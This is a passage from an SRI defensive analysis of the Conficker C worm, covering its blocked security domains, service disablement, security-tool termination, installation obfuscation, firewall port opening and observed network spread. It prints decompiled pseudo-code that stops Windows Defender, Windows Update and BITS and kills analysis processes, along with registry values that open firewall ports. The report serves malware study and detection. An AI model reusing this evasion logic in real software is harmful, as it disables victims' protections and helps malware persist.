tcpview\n\nnai. fortinet quickheal sysclean\n\nmsft. f-secure ptsecurity scct_\n\nmsdn. f-prot prevx regmon\n\nllnwd. ewido pctools procmon\n\nllnw. etrust panda procexp\n\nkav. eset onecare ms08-06\n\ngmer. esafe norton mrtstub\n\ncert. emsisoft norman mrt.\n\nca. dslreports nod32 mbsa.\n\nbit9. drweb networkassociates klwk\n\n\n-----\n\navp. defender mtc.sri kido\n\navg. cyber-ta msmvps kb958\n\nwindowsupdate cpsecure msftncsi kb890\n\nwilderssecurity conficker mirage hotfix\n\nvirus computerassociates microsoft gmer\n\nvirscan comodo mcafee filemon\n\ntrojan clamav malware downad\n\ntrendmicro centralcommand kaspersky confick\n\nthreatexpert ccollomb k7computing avenger\n\nthreat castlecops jotti autoruns\n\ntechnet bothunter ikarus safety.live\n\nsymantec avira hauri rootkit\n\nsunbelt avgate hacksoft securecomputing\n\nspyware avast hackerwatch ahnlab\n\nspamhaus arcabit grisoft wireshark\n\nsophos antivir gdata\n\nsecureworks anti- agnitum\n\nTable 1: Patched blocked domains list\n\nWhen a domain lookup occurs that matches one of the above strings, the IP translation does not\nsucceed and the host does not successfully connect to the target domain. On Vista, a matching\ndomain name is replaced by a random garbage string, and the lookup proceeds using this string.\nOn Windows XP and earlier OSs, the lookup simply times out, and the connection attempt\neffectively hangs.\n\n### Windows Security Service Disablement\n\nEach time it starts, Conficker C spawns a thread to disable security services and terminate\nConficker removal software.  This thread is responsible for disabling Windows services that\ndeliver security patches and software updates, effectively preventing the victim host from receiving\nautomated software updates. For example, in addition to disabling Windows Defender and the\nWindows error reporting service, this logic disables BITS (Background Intelligent Transfer Service).\n\n\n-----\n\nThe BITS service is used to prioritize, throttle, and control asynchronous file transfers between\nmachines using idle network bandwidth. It is used by the Windows Update services and other\nsoftware updaters to stay current with the latest patches and security hot fixes.\n\n[Figure 6 provides a pseudo-code summary of the security disablement thread. The main program](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#fig-sec-disablement-code)\nlogic is shown in function disable_security_services_and_terminate_conficker_cleaners(). This\nfunction disables Windows Security Center Service (wscsvc), Windows Defender Service\n(WinDefend), Windows Automatic Update Service (wuauserv), BITS (Background Intelligent\nTransfer Service), Windows Error Reporting Service (ERSvc), and the Windows Error Reporting\nService (WerSvc). It further deletes Windows Defender from the Run Registry Key, deactivates\nsecurity center notifications (FD6905CE-952F-41F1-9A6F-135D9C6622CC), and deletes the\nsafeboot security key. It then spawns the monitor_and_terminate_conficker_cleaners thread,\n[discussed in Security Product Terminator Thread.](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#process-termination)\n\n[The disable_security_service pseudo-code is also show in Figure 6.  This function Illustrates the](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#fig-sec-disablement-code)\nactual logic used to disable the five security services. First, C opens the security manager with all\naccess privileges. It then loops through the set of resident services, ignoring all services reported\nas kernel devices. If it finds a matching device name, it first shuts down the service, sleeps for 4\nseconds, and then sets the service configuration to permanently disable the service.\n\nBOOL disable_security_services_and_terminate_conficker_cleaners()\n{\nHANDLE v;\nvoid *ThreadId;\n\nThreadId = this;\ndisable_security_service(\"wscsvc\");\ndisable_security_service(\"WinDefend\");\ndisable_security_service(\"wuauserv\");\ndisable_security_service(\"BITS\");\ndisable_security_service(\"ERSvc\");\ndisable_security_service(\"WerSvc\");\nSHDeleteValueA(HKEY_LOCAL_MACHINE, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\n\\\\Run\", \"Windows Defender\");\ncallSHDeleteKeyW(\nHKEY_LOCAL_MACHINE,\n\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\explorer\\\\ShellServiceObjects\\\\\n{FD6905CE-952F-41F1-9A6F-135D9C6622CC}\");\ncallSHDeleteKeyW(HKEY_LOCAL_MACHINE, \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\");\nv = CreateThread(0, 0, monitor_and_terminate_conficker_cleaners, 0, 0, (DWORD *)\n&ThreadId);\n**return CloseHandle(v);**\n}\n\nint disable_security_service(LPCSTR lpServiceName)\n{\n\n\n-----\n\nvoid hSCObject;\nchar ServiceStatus;\nint v;\n\nresult = 0;\nhSCObject = OpenSCManagerA(0, 0, SC_MANAGER_ALL_ACCESS);\n_// open service manager with all access granted_\n**if ( hSCObject )**\n{\nv = OpenServiceA(hSCObject, lpServiceName, 0x20027u);\n_// open the specified service_\n**if ( v )**\n{\n**if ( QueryServiceStatus(v, (struct _SERVICE_STATUS *)&ServiceStatus) )**\n_// query the service status_\n{\n**if ( ServiceType != SERVICE_KERNEL_DRIVER )**\n_// check if the service is not a device driver_\n{\nsuccess = ControlService(v, 1u, (struct _SERVICE_STATUS *)\n&ServiceStatus); // notifies the service that it should stop\n**if ( success )**\nSleep(4000); // sleep 4 seconds\n}\n}\nresult |= ChangeServiceConfigA(v, 0xFFFFFFFFu, 4u, 0xFFFFFFFFu,\n0, 0, 0, 0, 0, 0, 0);\n_// set the service configuration so that the service is never started_\nCloseServiceHandle(v);\n}\nCloseServiceHandle(hSCObject);\n}\n**return result;**\n}\n\nFigure 6: Security service and process disablement logic\n\n### Security Product Terminator Thread\n\nConficker's disable_security_services_and_terminate_conficker_cleaners() function, as discussed\nin [Windows Security Service Disablement, spawns a separate thread charged with terminating](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#service-disablement)\n[active security processes. The monitor_and_terminate_conficker_cleaners(), shown in Figure 7,](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#fig-monitor_and_terminate)\nruns an infinite search for a set of blacklisted security processes. If found, it first suspends all\ntasks of the associated process, and then terminates the process.\n\n\n-----\n\nvoid __stdcall monitor_and_terminate_conficker_cleaners()\n\n{\n**while ( 1 )**\n\n{\n\nterminate_conficker_cleaners();\n_// terminate processes that are in the list of conficker cleaners_\n\nSleep(1000); // sleep 1 second\n\n}\n\n}\n\nint terminate_conficker_detectors()\n\n{\nint result;\n\nint n;\n\nchar Str;\n\nint v;\n\nDWORD ProcessId;\n\nresult = CreateToolhelp32Snapshot(2u, 0); // open the list of processes\n\n**if ( result != -1 )**\n\n{\n\nv = Process32First((HANDLE)result, (PROCESSENTRY32 *)&pe);\n\n**while ( v )**\n\n{\n\nstrlwr(&Str);\n\nn = 0;\n\n**while ( n < 23 ) // check 23 names of conficker cleaners**\n\n{\n\n**if ( strstr(&Str, (&array_conficker_cleaners_utilities)[4 * n]) )**\n\n_// check if the process name has a substring in the array of_\n_// conficker cleaners utilities_\n\nterminate_process(ProcessId);\n\n_// terminate the process_\n\nn++;\n\n}\n\nv = Process32Next(v, (PROCESSENTRY32 *)&pe);\n\n}\n\nresult = CloseHandle(v);\n\n}\n\n**return result;**\n\n}\n\nFigure 7: Security process termination logic\n\nThe following 23 processes are immediated terminated by C's process monitoring thread\nwhenever they are discovered running on the victim host:\n\n1. autoruns  - malware removal tool\n\n2. avenger   - antivirus / firewall\n\n3. confick   - cleanup utilities\n\n\n-----\n\n4. downad   - cleanup utilities\n5. filemon   - security utility)\n6. gmer    - rootkit detector and remover (gmer.net)\n7. hotfix   - security patch or removal tools\n8. kb890    - Microsoft patch\n9. kb958    - Microsoft patch\n10. kido    - security patch or removal tools\n\n11. klwk    - Karspersky malware removal tool\n12. mbsa.    - Microsoft Baseline Security Analyser\n13. mrt     - Microsoft malware removal tool\n14. mrtstub   - Microsoft malware removal tool\n15. ms08-06   - Microsoft patch\n16. procexp   - process explorer\n17. procmon   - process monitor\n18. regmon   - registry monitor\n19. scct_    - unknown\n20. sysclean  - Trend Micro malware removal tool\n21. tcpview   - network packet analysis tool\n22. unlocker  - file unlocking utility\n23. wireshark  - network packet analysis tool\n\n### Obfuscating C's Installation and Its Presence\n\nLike variants A and B, variant C begins obfuscating its presence at the moment its (bootstrapping)\nDLL is initialized on the victim host.  Upon initialization, the DLL creates a protected memory\nsegment, and then spawns this segment as a remote thread to the netsvcs or explorer process,\ndepending on the OS. It sets the SVC display name to nil, does not return from the loadlib\ninitialization function, and effectively prevents standard Windows service utilities from listing its\nDLL as loaded and active. Once the process is activated, it stores its DLL under a randomly\ngenerated filename (with DLL extension), and sets the date of the DLL to that of kernel32.dll. The\nfile is then stored on disk using the following directory selection logic:\n\n1. It attempts to place the DLL in the System32 directory\n2. It attempts to place the DLL inside the Program Files directory. Here it attempts to select one\n\nof the following subdirectories: \\\\Movie Maker, \\\\Internet Explorer, \\\\Windows Media Player,\n\\\\Windows NT\n3. It places the DLL in the user temp directory\n\nC must also alter the registry to ensure that its DLL is reloaded at next boot.  To cloak its registry\nkey settings, C randomly selects and sets various registry keys to obfuscate the modifications it\nmade to the svchosts or netsvcs registry segments.\n\n\n-----\n\nThe following strings are added to the registry to obfuscate svchost s registry configuration\nchanges: App, Audio, DM, ER, Event, help, Ias, Ir, Lanman, Net, Ntms, Ras, Remote, Sec, SR,\nTapi, Trk, W32, win, Wmdm, Wmi, wsc, wuau, xml, access, agent, auto, logon, man, mgmt, mon,\nprov, serv, Server, Service, Srv, srv, Svc, svc, System, Time.\n\nThe following are strings that are added to the registry to obfuscate netsvcs's registry configuration\nchanges: Boot, Center, Config, Driver, Helper, Image, Installer, Manager, Microsoft, Monitor,\nNetwork, Security, Server, Shell, Support, System, Task, Time, Universal, Update, Windows,\nHardware, Control, Audit, Event, Notify, Backup, Trusted, Component, Framework, Management,\nBrowser, Machine, Logon, Power, Storage, Discovery, Policy.\n\n### Firewall Disablement\n\nTo interact with external clients during P2P communications, C disables the blocking of several\nhigh-order TCP and UDP application ports.  This is done through HKLM modifications, where the\nopened ports are listed in the GloballyOpenPorts registry key. These ports are fixed per Conficker\ninstallation.  The following is an example set of firewall modifications made during a Conficker C\nrun:\n\nSYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List,\nValue Name: 11930:TCP, New Value: 11930:TCP:*:Enabled:PackagesOffice MSDownloaded\n\nSYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List,\nValue Name: 45436:TCP, New Value: 45436:TCP:*:Enabled:PackagesOffice SpeechGames\n\nSYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List,\nValue Name: 48481:UDP, New Value: 48481:UDP:*:Enabled:PackagesOffice PagesPages\n\nSYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List,\nValue Name: 57338:UDP, New Value: 57338:UDP:*:Enabled:PackagesOffice MediaDistribution\n\nListed with these firewall port disablement changes are apparent product package names, such as\nMSDownloaded, SpeechGames, MediaDistribution, and PagesPages.  These package names\nare bogus, and appear to associate these security changes to software packages that appear\nbenign.\n\n## Global Network Impact\n\nFrom nearly the moment of its initial outbreak on 5 March 2009 (UTC), Conficker C has produced\na visible effect on Internet-wide scan patterns.  Following connection patterns from a series of\nports used across Conficker variants, we are able to track the spread of C infections from within\nour honeynet. By following volume drops in Conficker A/B/B++ TCP/445 scan sources, with the\nrise in Conficker C's TCP and UDP P2P scan activity, we can accurately estimate the time of\nrelease and relative size of Conficker C.\n\n\n-----\n\nWe believe the primary delivery mechanism used to distribute variant C has been Internet\n[rendezvous points, which had reportedly been blocked [15] .  Numerous examples of Conficker](http://public.mtc.sri.com/Conficker/addendumC/ref-15)\nC's Win32 dropper executables have reportedly been delivered into pre-infected Conficker B hosts\n(we do not yet have confirmed reports of Conficker A upgrades). When received by a B host, the\ndropper application performs the following actions:\n\n1. it conducts a self-expiration check and exits if stale (we have observed 72 hour expirations)\n2. checks the machine for C-specific mutexes, which would indicate this machine has already\n\nbeen upgraded.  If found, the dropper exits\n3. drops a local DLL file into the user's temp directory using a temporary file name\n4. invokes the dropped DLL using rundll32.exe, which spawns Conficker C\n5. deletes itself (the dropper application) from the system\n\nIn [Figure 8, we present a network traffic analysis that illustrates the impact of Conficker C](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#fig-445tcp-scan-drops)\nupgrades. As shown in this figure, there is a significant drop in TCP/445 scanning activity, which\ncoincides with the rise in UDP and TCP P2P activity from Conficker C. The drop in TCP/445\n[activity was corroborated with similar drops in CAIDA's telescope [17].](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#ref-caida-report)\n\nFigure 8: Conficker port 445/TCP and P2P scan\ndropoffs observed beginning 5 March 2009 (UTC)\n\n\n-----\n\nBased on our measurements, the first wave of Conficker C upgrades began at roughly 6 p.m. PST\n[on 4 March 2009 (2 a.m. GMT on 5 March 2009). As illustrated in Figure 8, we can see that this](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#fig-445tcp-scan-drops)\nfirst wave of upgrades impacted approximately 20% of Conficker hosts. These upgrades occurred\nin close proximity to the date change of 5 March 2009 UTC, implying that when active B machines\nvisited their new set of rendezvous points on this new day, the Conficker authors had likely\n[established a server ready to deliver the C dropper application.  Figure 8 also illustrates that a](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#fig-445tcp-scan-drops)\nsecond upgrade occurred on 17 March 2009 (UTC), claiming as much as another 50% of the\nremaining B population.\n\n## In-Situ Analysis - Sandbox Operations\n\nWe used dynamic sandbox monitoring techniques to evaluate the interactions of Conficker C when\noperating live on the Internet. The release used for this analysis was monitored and filtered such\nthat it would not cause harm to other external hosts while these experiments were being\nconducted.\n\nWe describe the network profile of a Conficker C infected host during a 30-minute sandbox\nexecution. Since our current experiments were conducted in early March 2009, we did not see the\nHTTP rendezvous point lookups. We expect this activity profile to change on 1 April.  During our\npre 1 April sandbox run, we observed the following network effects, which are illustrated in Figure\n9.\n\nDNS queries at a rate of 10 to 25 per 5-minute interval were observed. We also observed web\nserver queries, which included connections to 4shared.com, adobe.com, allegro.pl, ameblo.jp,\nanswers.com, aweber.com, badongo.com, baidu.com. bbc.co.uk, blogfa.com, clicksor.com,\ncomcast.net, cricinfo.com, disney.go.com, ebay.co.uk, facebook.com, fastclick.com, friendster.com,\nimdb.com, megaporn.com, megaupload.com, miniclip.com, mininova.org, ning.com,\nphotobucket.com, rapidshare.com, reference.com, seznam.cz, soso.com, studiverzeichnis.com,\ntianya.cn, torrentz.com, tribalfusion.com, tube8.com, tuenti.com, typepad.com, ucoz.ru, veoh.com,\nvkontakte.ru,wikimedia.org, wordpress.com, xnxx.com, yahoo.com, and youtube.com.\n\nP2P queries were sent to random hosts on high-order ports. This is steady at a rate of 50 to 60\nhosts per 5 minutes in TCP and a rate of 240 to 2500 hosts per 5 minutes in UDP. The failed TCP\nand UDP attempts also result in a high rate of inbound ICMP backscatter.\n\nThere are also six HTTP connections that were all successfully established in the first 5 minutes to\ntuenti.com, tianya.cn, miniclip.com, blogfa.com, answers.com and rapidshare.com. In each case,\nthe GET request was to the top directory (GET / HTTP/1.1). Responses are gzip-encoded HTML\ncontent.\n\nGET / HTTP/1.1\n\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-ms-application,\napplication/vnd.ms-xpsdocument, application/x-ms-xbap, */*\n\nAccept-Language: en-GB\n\n\n-----\n\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 1.1.4322;\n.NET CLR 2.0.50727; .NET CLR 3.0.04506.30)\nHost: rapidshare.com\nConnection: Keep-Alive\n\n**Figure 9: Pre 1 April 2009 short-term network traffic profile**\n\n\n-----\n\n**Figure 10: Post 1 April 2009 6-hour network traffic profile**\n\nWe also created a new (mutated) version of the binary that executes the post 1 April 2009 logic.\n[The graph in Figure 10 summarizies a long-running (6-hour) network trace of this binary. This](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#fig-6hr-insitu)\nfigure captures the volumes of observed outbound communication attempts over the multihour run:\nHTTP, DNS, TCP P2P and UDP P2P, activity. The DNS activity includes two components:\nattempts to contact the 500 rendezvous points, and attempts to contact Internet portals for finding\nthe date. The trace from this live experimental run corroborates our static analysis results: each C\nhost contacts 500 rendezvous points each day over 116 TLDs with a flat entropy (random domain\nname space). We see a dropoff in overall levels of DNS activity after hour 3 when it has looked\nup the IP addresses of all 500 domains. In our case, all these were failed (NXDOMAIN) attempts,\nas these domains have not yet been registered.\n\nThe UDP and TCP P2P activity also drops off in the first 2-hours before settling on a steady\nscanning rate. The HTTP date check activity remains a relatively steady six to nine hosts\ncontacted per hour. The key implication from the in-situ analysis is that it should be fairly easy to\nfingerprint Conficker C based upon its unique TCP and UDP scanning patterns. We should also\nbe able to identify C hosts (starting 1 April 2009) based on the volume of NXDOMAIN responses\nthese hosts would receive for failed DNS lookups.\n\n\n-----\n\n## Conclusion\n\nWe present an analysis of Conficker Variant C, which emerged on the Internet at roughly 6 p.m.\n(PST) on 4 March 2009. This variant incorporates significant new functionality, including a new\ndomain generation algorithm and a new peer-to-peer file sharing service.  Absent from our\ndiscussion has been any reference to the well-known attack propagation vectors (RCP buffer\noverflow, USB, and NetBios Scans) that have allowed C's predecessors to saturate so much of the\nInternet. Although not present in C, these attack propagation services are but one peer upload\naway from any C infected host, and may appear at any time.  C is, in fact, a robust and secure\ndistribution utility for distributing malicious content and binaries to millions of computers across the\nInternet.  This utility incorporates a potent arsenal of methods to defend itself from security\nproducts, updates, and diagnosis tools. It further demonstrates the rapid development pace at\nwhich Conficker's authors are maintaining their current foothold on a large number of Internetconnected hosts. Further, if organized into a coordinated offensive weapon, this multimillion-node\nbotnet poses a serious and dire threat to the Internet.\n\nOur report represents one of many Conficker analysis studies going on throughout the whitehat\ncommunity, and we are in direct contact with numerous groups that will produce additional details,\nand will help clarify errors that exist in this report. This report is a living document, and we will\nupdate it regularly, as our understanding of variant C continues to grow.\n\n## Acknowledgments\n\nWe would like to thank Drew Dean from SRI's Computer Science Laboratory for his assistance in\nunderstanding the binary validation routine.  We would like to thank Bruce Dang from Microsoft\nfor his assistance in understanding the mutex key generation.  We would like to thank Arvind\nNarayanan from the University of Texas at Austin for his collaboration in the developing the\nHorizontal Malware Analysis tool shown in Appendix 2.\n\n## References\n\n[4] P.A. Porras, H. Saidi, and V. Yegneswaran. \"A Multiperspective Analysis of the Storm Worm.\n[SRI Technical Report, 2007. http://www.cyber-ta.org/pubs/StormWorm/](http://www.cyber-ta.org/pubs/StormWorm/)\n\n[12] Eric Chien, \"Downadup: Peer-to-Peer Payload Distribution,\" 2009.\n\nhttp://myitforum.com/cs2/blogs/cmosby/archive/2009/01/22/downadup-peer-to-peer-payloaddistribution-symantec-security-response-blog.aspx\n\n\n-----\n\n[15] Jose Nazario, \"The Conficker Cabal Announced,\" Arbor Networks, 12 February 2009.\n[http://asert.arbornetworks.com/2009/02/the-conficker-cabal-announced/](http://asert.arbornetworks.com/2009/02/the-conficker-cabal-announced/)\n\n[16] SRI International, \"A Comparative Assessment of Conficker B++ vs Conficker C,\" 06 March\n2008.\n[http:/mtc.sri.com/Conficker/addendumC/HMA_Compare_ConfB2_ConfC/](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/HMA_Compare_ConfB2_ConfC/index.html)\n\n[17] CAIDA, \"Conficker/Conflicker/Downadup as seen from the UCSD Network Telescope,\"\nFebruary 2009.\n[http://www.caida.org/research/security/ms08-067/conficker.xml](http://www.caida.org/research/security/ms08-067/conficker.xml)\n\n## Appendices\n\n### Appendix 1 Embedded Strings Within Conficker C\n\nWe have extracted and categorized the set of strings that are embedded in the Conficker C binary.\n[The full set of embedded Conficker C strings is listed HERE.](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/appendix1.html)\n\n### Appendix 2  Domain Generator Filtered Address Ranges\n\nWe have isolated the full set of IP address ranges that are used to prefilter all IP addresses\n[produced by the Conficker C domain generation algorithm. This blocklist is shown HERE.](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/appendix2.html)\n\n### Appendix 3  A Comparative Assessment of Conficker B and C Process Images\n\nThis is a comparative assessment of the Conficker B++ vs. Conficker C disassembled process\n[images. The complete comparative assessment of B++ vs C is available HERE.](http://mtc.sri.com/Conficker/addendumC/HMA_Compare_ConfB2_ConfC/)\n\n### Appendix 4  Sandbox Results from Running Conficker C\n\nThis appendix shows a forensic analysis of the Conficker C binary as captured through dynamic\n[network analysis and sandbox testing. See the full list of forensic results HERE.](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/appendix4.html)\n\n### Appendix 5  API Recovery Table\n\nThis appendix maps the set of obfuscated APIs to their code offsets. The map is useful for a\n[reverse engineering analyst to understand the P2P protocol logic. See the API list HERE.](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/appendix5.html)\n\n\n-----\n\nSponsors\n\nNational Science Foundation\n(Dr. Karl Levitt, CyberTrust)\n\nand\n\nU.S. Army Research Office\n( Dr. Cliff Wang, Cyber-TA)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2003 - 2009/2009-03-08 - Conficker C Analysis.pdf"
    ],
    "report_names": [
        "2009-03-08 - Conficker C Analysis.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536027,
    "ts_updated_at": 1743041168,
    "ts_creation_date": 1653759744,
    "ts_modification_date": 1653759744,
    "files": {
        "pdf": "https://archive.orkl.eu/fefc6706f8b254f670a3f367ff70a4a547bbe834.pdf",
        "text": "https://archive.orkl.eu/fefc6706f8b254f670a3f367ff70a4a547bbe834.txt",
        "img": "https://archive.orkl.eu/fefc6706f8b254f670a3f367ff70a4a547bbe834.jpg"
    }
}